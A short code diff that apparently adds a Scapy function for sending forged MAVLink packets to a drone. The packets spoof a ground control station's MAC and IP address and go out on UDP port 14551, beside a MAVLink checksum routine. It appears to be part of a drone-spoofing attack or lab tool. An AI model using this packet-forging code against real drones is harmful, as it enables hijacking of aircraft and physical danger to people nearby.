@@ -3,6 +3,15 @@ import time
 import hashlib
 import struct
 
+def send_fake_mavlink_msg(fake_msg):
+    ether = Ether(src=fake_gcs_mac, dst="08:00:27:9e:65:fa")
+    ip = IP(src=fake_gcs_ip, dst=drone_ip)
+    udp = UDP(sport=14551, dport=drone_port) # UDP端口
+    pkt = ether / ip / udp / fake_msg
+    sendp(pkt, iface="enp0s3") # 网卡接口
+    return pkt
+
+
 def crc_accumulate(byte, crc):
     tmp = byte ^ (crc & 0xff)
     tmp ^= (tmp << 4) & 0xff
